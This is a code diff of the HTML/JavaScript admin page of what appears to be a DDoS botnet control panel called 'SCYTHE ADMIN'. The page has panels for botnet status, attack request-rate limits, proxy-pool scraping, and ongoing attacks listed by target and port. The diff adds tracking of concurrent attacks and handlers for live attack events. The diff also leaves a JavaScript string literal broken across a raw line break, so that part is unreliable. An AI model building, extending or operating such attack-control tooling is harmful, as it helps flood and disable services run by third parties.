@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SCYTHE ADMIN v8.2 - Real-Time Control Center</title>
+    <title>SCYTHE ADMIN v8.3 - Real-Time Control Center</title>
     <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -373,7 +373,6 @@
             font-size: 13px;
         }
 
-        /* ===== LIVE PROXY MONITOR STYLES ===== */
         .proxy-monitor-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
@@ -412,7 +411,6 @@
         .proxy-source-item .rate { color: var(--neon-green); }
         .proxy-source-item .rate.bad { color: var(--neon-red); }
 
-        /* ===== RPS ALERT STYLES ===== */
         .alert-card {
             background: rgba(0,0,0,0.3);
             border: 1px solid rgba(255,0,64,0.2);
@@ -433,7 +431,6 @@
         .alert-card .time { color: rgba(0,255,65,0.5); font-size: 11px; }
         .alert-card .cause { color: rgba(255,0,64,0.7); margin-top: 4px; }
 
-        /* ===== WEBSOCKET STATUS ===== */
         .ws-status {
             display: inline-flex;
             align-items: center;
@@ -457,7 +454,6 @@
             animation: pulse 1s infinite;
         }
 
-        /* ===== REFRESH LOG STYLES ===== */
         .refresh-log-container {
             max-height: 150px;
             overflow-y: auto;
@@ -472,6 +468,29 @@
             color: rgba(0,243,255,0.7);
         }
         .refresh-log-entry .time { color: rgba(0,255,65,0.4); margin-right: 8px; }
+
+        .concurrent-badge {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 14px;
+            font-weight: 700;
+            padding: 4px 12px;
+            border-radius: 4px;
+            border: 1px solid var(--neon-orange);
+            color: var(--neon-orange);
+            background: rgba(255,136,0,0.1);
+            display: inline-block;
+            margin-top: 10px;
+        }
+        .concurrent-badge.active {
+            border-color: var(--neon-green);
+            color: var(--neon-green);
+            background: rgba(0,255,65,0.15);
+        }
+        .concurrent-badge.full {
+            border-color: var(--neon-red);
+            color: var(--neon-red);
+            background: rgba(255,0,64,0.15);
+        }
     </style>
 <base target="_blank">
 </head>
@@ -488,16 +507,15 @@
             </div>
             <div class="status-dot"></div>
             <span>SYSTEM ONLINE</span>
-            <a href="/" class="nav-link">← BACK TO DASHBOARD</a>
+            <a href="/" class="nav-link">BACK TO DASHBOARD</a>
         </div>
         <div class="clock" id="clock">00:00:00</div>
     </header>
 
     <main class="main-grid">
-        <!-- ===== System Health ===== -->
         <div class="panel full-width">
             <div class="panel-header green">
-                🩺 System Health
+                System Health
                 <span class="badge green" id="healthBadge">ALL GOOD</span>
             </div>
             <div id="healthContainer">
@@ -508,16 +526,15 @@
                 <div class="health-item"><span class="label">Botnet Connection</span><span class="status loading" id="healthBotnet">Checking...</span></div>
             </div>
             <div style="margin-top:15px;display:flex;gap:10px;flex-wrap:wrap;">
-                <button class="btn green" onclick="checkHealth()">🔄 Refresh Health</button>
-                <button class="btn cyan" onclick="restartService()">♻️ Restart Service</button>
-                <button class="btn red" onclick="clearLogs()">🗑️ Clear Logs</button>
+                <button class="btn green" onclick="checkHealth()">Refresh Health</button>
+                <button class="btn cyan" onclick="restartService()">Restart Service</button>
+                <button class="btn red" onclick="clearLogs()">Clear Logs</button>
             </div>
         </div>
 
-        <!-- ===== Live Proxy Monitor ===== -->
         <div class="panel full-width">
             <div class="panel-header purple">
-                🔍 Live Proxy Monitor
+                Live Proxy Monitor
                 <span class="badge purple" id="proxyMonitorBadge">LIVE</span>
             </div>
             <div class="proxy-monitor-grid">
@@ -535,38 +552,36 @@
                 </div>
             </div>
             <div style="margin-bottom:15px;">
-                <strong style="color:var(--neon-purple);font-size:12px;text-transform:uppercase;">📡 Proxy Source Performance</strong>
+                <strong style="color:var(--neon-purple);font-size:12px;text-transform:uppercase;">Proxy Source Performance</strong>
                 <div class="proxy-source-list" id="proxySourceList">
                     <div style="text-align:center;padding:10px;color:rgba(0,255,65,0.3);">Loading sources...</div>
                 </div>
             </div>
             <div>
-                <strong style="color:var(--neon-cyan);font-size:12px;text-transform:uppercase;">📝 Recent Proxy Refresh Log</strong>
+                <strong style="color:var(--neon-cyan);font-size:12px;text-transform:uppercase;">Recent Proxy Refresh Log</strong>
                 <div class="refresh-log-container" id="refreshLogContainer">
                     <div class="refresh-log-entry"><span class="time">--:--:--</span>Waiting for refresh data...</div>
                 </div>
             </div>
         </div>
 
-        <!-- ===== RPS Drop Alert ===== -->
         <div class="panel full-width">
             <div class="panel-header red">
-                🚨 RPS Drop Alert Monitor
+                RPS Drop Alert Monitor
                 <span class="badge red" id="alertBadge">MONITORING</span>
             </div>
             <div id="rpsAlertContainer">
                 <div style="text-align:center;padding:20px;color:rgba(0,255,65,0.3);">No alerts detected. System healthy.</div>
             </div>
             <div style="margin-top:10px;display:flex;gap:10px;flex-wrap:wrap;">
-                <button class="btn red" onclick="clearAlerts()">🧹 Clear Alerts</button>
-                <button class="btn cyan" onclick="testAlert()">🧪 Test Alert</button>
+                <button class="btn red" onclick="clearAlerts()">Clear Alerts</button>
+                <button class="btn cyan" onclick="testAlert()">Test Alert</button>
             </div>
         </div>
 
-        <!-- ===== Proxy Management ===== -->
         <div class="panel full-width">
             <div class="panel-header green">
-                🌐 Proxy Management
+                Proxy Management
                 <span class="badge green" id="proxyBadge">MANUAL</span>
             </div>
             <div class="stats-grid" style="margin-bottom:20px;">
@@ -587,18 +602,16 @@
                     <div class="stat-label">Last Scrap</div>
                 </div>
             </div>
-
             <div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:15px;">
-                <button class="btn cyan" onclick="refreshProxyPool()">🔄 Refresh Pool</button>
-                <button class="btn red" onclick="removeDeadProxies()">🧹 Remove Dead</button>
-                <button class="btn orange" onclick="scrapProxy()">📥 Scrap Proxy</button>
+                <button class="btn cyan" onclick="refreshProxyPool()">Refresh Pool</button>
+                <button class="btn red" onclick="removeDeadProxies()">Remove Dead</button>
+                <button class="btn orange" onclick="scrapProxy()">Scrap Proxy</button>
             </div>
-
             <div style="margin-bottom:15px;">
                 <label class="form-label" style="color:var(--neon-cyan);font-size:12px;text-transform:uppercase;">Scrap URLs (one per line)</label>
-                <textarea class="form-control" id="scrapUrls" placeholder="http://proxy-list.com/proxies.txt&#10;https://api.proxy.com/list"></textarea>
+                <textarea class="form-control" id="scrapUrls" placeholder="http://proxy-list.com/proxies.txt
+https://api.proxy.com/list"></textarea>
             </div>
-
             <div>
                 <strong style="color:var(--neon-cyan);font-size:12px;text-transform:uppercase;">Proxy List (alive)</strong>
                 <div class="proxy-list" id="proxyListContainer">
@@ -607,10 +620,9 @@
             </div>
         </div>
 
-        <!-- ===== Botnet & Stats ===== -->
         <div class="panel">
             <div class="panel-header cyan">
-                🤖 Botnet Status
+                Botnet Status
                 <span class="badge cyan">ACTIVE</span>
             </div>
             <div class="stats-grid">
@@ -633,10 +645,9 @@
             </div>
         </div>
 
-        <!-- ===== Concurrent Control + RPS Limit ===== -->
         <div class="panel">
             <div class="panel-header orange">
-                ⚙️ Control Center
+                Control Center
                 <span class="badge" style="border-color:var(--neon-orange);color:var(--neon-orange);">SYNC</span>
             </div>
             <div class="concurrent-control">
@@ -651,9 +662,14 @@
                     <div class="stat-label">Currently Set</div>
                 </div>
             </div>
+            <div style="margin-top:10px;">
+                <div class="concurrent-badge" id="concurrentBadge">
+                    <span id="activeAttacksCount">0</span> / <span id="maxConcurrentDisplay">5</span> ACTIVE
+                </div>
+            </div>
 
             <div class="rps-control">
-                <label>🎯 Attack RPS Limit</label>
+                <label>Attack RPS Limit</label>
                 <input type="number" id="rpsLimitInput" value="0" min="0" step="1000">
                 <button class="btn cyan" onclick="setRpsLimit()">Set RPS</button>
                 <span style="color:rgba(0,255,65,0.5);font-size:12px;">(0 = unlimited)</span>
@@ -666,10 +682,9 @@
             </div>
         </div>
 
-        <!-- ===== Ongoing Attacks ===== -->
         <div class="panel full-width">
             <div class="panel-header cyan">
-                🔥 Ongoing Attacks
+                Ongoing Attacks
                 <span class="badge cyan" id="ongoingBadge">0 ACTIVE</span>
             </div>
             <div id="ongoingAttacksContainer">
@@ -677,21 +692,20 @@
             </div>
         </div>
 
-        <!-- ===== System Logs ===== -->
         <div class="panel full-width">
             <div class="panel-header red">
-                📋 System Logs
+                System Logs
                 <span class="badge red">LIVE</span>
             </div>
             <div class="log-container" id="logContainer">
-                <div class="log-entry">[SYSTEM] Admin panel initialized.</div>
+                <div class="log-entry">[SYSTEM] Admin panel v8.3 initialized.</div>
                 <div class="log-entry">[SYSTEM] Waiting for commands...</div>
             </div>
         </div>
     </main>
 
     <footer class="footer">
-        SCYTHE ADMIN v8.2 | Real-Time Control Center | <span>Full System Control</span> | Sync: <span>Dashboard + Admin</span>
+        SCYTHE ADMIN v8.3 | Real-Time Control Center | <span>Full System Control</span> | Sync: <span>Dashboard + Admin</span>
     </footer>
 
     <div id="alertBox" class="alert"></div>
@@ -769,6 +783,7 @@
             }
         }
 
+        // FIX: Handle attack_update WebSocket message type
         function handleWebSocketMessage(msg) {
             if (msg.type === 'rps_alert') {
                 addRpsAlert(msg.data);
@@ -777,6 +792,50 @@
                 updateProxyMonitor(msg.data);
             } else if (msg.type === 'periodic_update') {
                 updateFromPeriodic(msg.data);
+            } else if (msg.type === 'attack_update') {
+                handleAttackUpdate(msg.data);
+            } else if (msg.type === 'attack_started') {
+                addLog(`[ATTACK] Started: ${msg.data.attack_id.substring(0, 16)}...`, 'attack');
+                loadActiveAttacks();
+                updateConcurrentBadge();
+            } else if (msg.type === 'attack_stopped') {
+                addLog(`[ATTACK] Stopped: ${msg.data.attack_id.substring(0, 16)}...`, 'attack');
+                loadActiveAttacks();
+                updateConcurrentBadge();
+            } else if (msg.type === 'attack_completed') {
+                addLog(`[ATTACK] Completed: ${msg.data.attack_id.substring(0, 16)}... | Total: ${msg.data.total_requests || 0} reqs`, 'success');
+                loadActiveAttacks();
+                updateConcurrentBadge();
+            }
+        }
+
+        function handleAttackUpdate(data) {
+            if (data.event === 'attack_started') {
+                addLog(`[ATTACK] Started via WS: ${data.attack_id.substring(0, 16)}...`, 'attack');
+                loadActiveAttacks();
+                updateConcurrentBadge();
+            } else if (data.event === 'attack_stopped') {
+                addLog(`[ATTACK] Stopped via WS: ${data.attack_id.substring(0, 16)}...`, 'attack');
+                loadActiveAttacks();
+                updateConcurrentBadge();
+            } else if (data.event === 'attack_completed') {
+                addLog(`[ATTACK] Completed via WS: ${data.attack_id.substring(0, 16)}...`, 'success');
+                loadActiveAttacks();
+                updateConcurrentBadge();
+            } else if (data.event === 'attack_progress') {
+                updateAttackProgress(data.attack_id, data.data);
+            }
+        }
+
+        function updateAttackProgress(attackId, data) {
+            const card = document.getElementById(`attack-card-${attackId}`);
+            if (card) {
+                const rpsEl = card.querySelector('.attack-rps');
+                const totalEl = card.querySelector('.attack-total');
+                const proxyEl = card.querySelector('.attack-proxy');
+                if (rpsEl) rpsEl.textContent = data.rps || 0;
+                if (totalEl) totalEl.textContent = (data.total_requests || 0).toLocaleString();
+                if (proxyEl) proxyEl.textContent = data.proxy_count || 0;
             }
         }
 
@@ -815,7 +874,6 @@
             addLog(`Health check completed. All online: ${allOnline}`, 'success');
         }
 
-        // ===== NEW: PROXY MONITOR (FIXED) =====
         async function loadProxyMonitor() {
             try {
                 const res = await fetch('/api/proxy/monitor');
@@ -896,7 +954,6 @@
             }
         }
 
-        // ===== RPS ALERT =====
         let alertHistory = [];
 
         function addRpsAlert(alert) {
@@ -946,7 +1003,6 @@
             showAlert('Test alert triggered!', 'warning');
         }
 
-        // ===== PROXY MANAGEMENT =====
         async function loadProxyStats() {
             try {
                 const res = await fetch('/api/proxy/stats');
@@ -973,7 +1029,7 @@
                     container.innerHTML = data.proxies.map(p => `
                         <div class="proxy-item">
                             <span class="ip">${p.ip}:${p.port}</span>
-                            <span class="alive">● Alive</span>
+                            <span class="alive">Alive</span>
                         </div>
                     `).join('');
                 } else {
@@ -1030,7 +1086,8 @@
                 showAlert('Please enter at least one URL.', 'error');
                 return;
             }
-            const urls = urlsText.split('\n').map(s => s.trim()).filter(u => u);
+            const urls = urlsText.split('
+').map(s => s.trim()).filter(u => u);
             addLog(`Scrapping ${urls.length} URL(s)...`);
             try {
                 const res = await fetch('/api/proxy/scrap', {
@@ -1054,7 +1111,6 @@
             }
         }
 
-        // ===== BOTNET & STATS =====
         async function loadBotnetStats() {
             try {
                 const res = await fetch('/api/botnet/stats');
@@ -1069,7 +1125,6 @@
             }
         }
 
-        // ===== CONCURRENT CONTROL =====
         async function setMaxConcurrent() {
             const val = parseInt(document.getElementById('maxConcurrentInput').value);
             if (isNaN(val) || val < 1) {
@@ -1088,8 +1143,11 @@
                     showAlert(`Max concurrent set to ${val}.`, 'success');
                     addLog(`Max concurrent updated to ${val}.`, 'success');
                     document.getElementById('currentConcurrent').textContent = val;
+                    document.getElementById('maxConcurrentDisplay').textContent = val;
+                    updateConcurrentBadge();
                 } else {
-                    showAlert('Failed: ' + data.error, 'error');
+                    showAlert('Failed: ' + (data.detail || data.message), 'error');
+                    addLog('Failed to set concurrent: ' + (data.detail || data.message), 'alert');
                 }
             } catch (e) {
                 showAlert('Error: ' + e.message, 'error');
@@ -1102,14 +1160,55 @@
                 const res = await fetch('/api/config/concurrent');
                 if (!res.ok) throw new Error('Failed');
                 const data = await res.json();
-                document.getElementById('currentConcurrent').textContent = data.max_concurrent || 5;
-                document.getElementById('maxConcurrentInput').value = data.max_concurrent || 5;
+                const val = data.max_concurrent || 5;
+                document.getElementById('currentConcurrent').textContent = val;
+                document.getElementById('maxConcurrentInput').value = val;
+                document.getElementById('maxConcurrentDisplay').textContent = val;
             } catch (e) {
                 addLog('Error loading concurrent config: ' + e.message);
             }
         }
 
-        // ===== RPS LIMIT CONTROL =====
+        // FIX: Update concurrent badge showing active/max
+        async function updateConcurrentBadge() {
+            try {
+                const [activeRes, maxRes] = await Promise.all([
+                    fetch('/api/attack/active'),
+                    fetch('/api/config/concurrent')
+                ]);
+                const activeData = await activeRes.json();
+                const maxData = await maxRes.json();
+
+                const activeCount = activeData.attacks ? activeData.attacks.length : 0;
+                const maxCount = maxData.max_concurrent || 5;
+
+                const badge = document.getElementById('concurrentBadge');
+                const activeSpan = document.getElementById('activeAttacksCount');
+                const maxSpan = document.getElementById('maxConcurrentDisplay');
+
+                activeSpan.textContent = activeCount;
+                maxSpan.textContent = maxCount;
+
+                if (activeCount >= maxCount) {
+                    badge.className = 'concurrent-badge full';
+                } else if (activeCount > 0) {
+                    badge.className = 'concurrent-badge active';
+                } else {
+                    badge.className = 'concurrent-badge';
+                }
+
+                const ongoingBadge = document.getElementById('ongoingBadge');
+                ongoingBadge.textContent = `${activeCount} ACTIVE`;
+                if (activeCount > 0) {
+                    ongoingBadge.className = 'badge green';
+                } else {
+                    ongoingBadge.className = 'badge cyan';
+                }
+            } catch (e) {
+                addLog('Error updating concurrent badge: ' + e.message);
+            }
+        }
+
         async function loadRpsLimit() {
             try {
                 const res = await fetch('/api/config/rps-limit');
@@ -1150,7 +1249,6 @@
             }
         }
 
-        // ===== SERVICE CONTROL =====
         async function restartService() {
             if (!confirm('Are you sure you want to restart the service?')) return;
             addLog('Restarting service...');
@@ -1188,7 +1286,6 @@
             }
         }
 
-        // ===== ONGOING ATTACKS =====
         async function loadActiveAttacks() {
             try {
                 const res = await fetch('/api/attack/active');
@@ -1213,24 +1310,24 @@
                     const progress = Math.min(100, (elapsed / (a.duration + (a.hold_time || 0))) * 100).toFixed(1);
 
                     return `
-                        <div class="ongoing-attack-card">
+                        <div class="ongoing-attack-card" id="attack-card-${a.id}">
                             <div class="ongoing-attack-header">
                                 <span class="ongoing-attack-id">${a.id.substring(0, 16)}...</span>
                                 <span class="ongoing-attack-method">${a.method.toUpperCase()}</span>
                             </div>
                             <div class="ongoing-attack-info">
-                                🎯 <span>${a.target}</span> | Port: <span>${a.port}</span> | 
-                                RPS: <span>${a.rps || 0}</span> | 
-                                Req: <span>${(a.total_requests || 0).toLocaleString()}</span> | 
-                                Proxy: <span>${a.proxy_count_current || 0}</span> | 
+                                Target: <span>${a.target}</span> | Port: <span>${a.port}</span> | 
+                                RPS: <span class="attack-rps">${a.rps || 0}</span> | 
+                                Req: <span class="attack-total">${(a.total_requests || 0).toLocaleString()}</span> | 
+                                Proxy: <span class="attack-proxy">${a.proxy_count_current || 0}</span> | 
                                 Remaining: <span>${remaining}s</span> | 
                                 Progress: <span>${progress}%</span>
                             </div>
                             <div class="ongoing-attack-rps-control">
-                                <label style="color:var(--neon-cyan);font-size:12px;">🎯 New RPS:</label>
+                                <label style="color:var(--neon-cyan);font-size:12px;">New RPS:</label>
                                 <input type="number" id="rps-update-${a.id}" value="${a.rps || 0}" min="0" step="100">
-                                <button class="btn cyan" onclick="updateAttackRps('${a.id}')">⚡ Update RPS</button>
-                                <button class="btn red" onclick="stopAttack('${a.id}')">🛑 Stop</button>
+                                <button class="btn cyan" onclick="updateAttackRps('${a.id}')">Update RPS</button>
+                                <button class="btn red" onclick="stopAttack('${a.id}')">Stop</button>
                             </div>
                         </div>
                     `;
@@ -1278,6 +1375,7 @@
                     showAlert('Attack stopped.', 'success');
                     addLog('Attack stopped.', 'success');
                     loadActiveAttacks();
+                    updateConcurrentBadge();
                 } else {
                     showAlert('Failed: ' + data.message, 'error');
                 }
@@ -1287,7 +1385,6 @@
             }
         }
 
-        // ===== UPDATE FROM PERIODIC =====
         function updateFromPeriodic(data) {
             if (data.proxy) {
                 document.getElementById('totalProxy').textContent = data.proxy.alive || 0;
@@ -1299,17 +1396,17 @@
             }
         }
 
-        // ===== POLLING =====
         function initPolling() {
             checkHealth();
             loadProxyStats();
             loadProxyList();
-            loadProxyMonitor();  // FIX: Load proxy monitor on init
+            loadProxyMonitor();
             loadBotnetStats();
             loadCurrentConcurrent();
             loadRpsLimit();
             loadActiveAttacks();
             loadProxySources();
+            updateConcurrentBadge();
 
             setInterval(() => {
                 checkHealth();
@@ -1318,17 +1415,17 @@
                 loadCurrentConcurrent();
                 loadRpsLimit();
                 loadProxySources();
-                loadProxyMonitor();  // FIX: Poll proxy monitor
+                loadProxyMonitor();
+                updateConcurrentBadge();
             }, 15000);
 
             setInterval(loadProxyList, 30000);
             setInterval(loadActiveAttacks, 5000);
         }
 
-        // ===== INIT =====
         connectWebSocket();
         initPolling();
-        addLog('Admin panel v8.2 loaded.', 'success');
+        addLog('Admin panel v8.3 loaded.', 'success');
         addLog('WebSocket connecting...');
         addLog('All systems ready.', 'success');
     </script>
